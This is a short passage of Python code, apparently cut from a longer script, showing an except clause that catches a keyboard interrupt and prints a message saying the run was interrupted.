    except KeyboardInterrupt:
        print("\ninterrupted.")
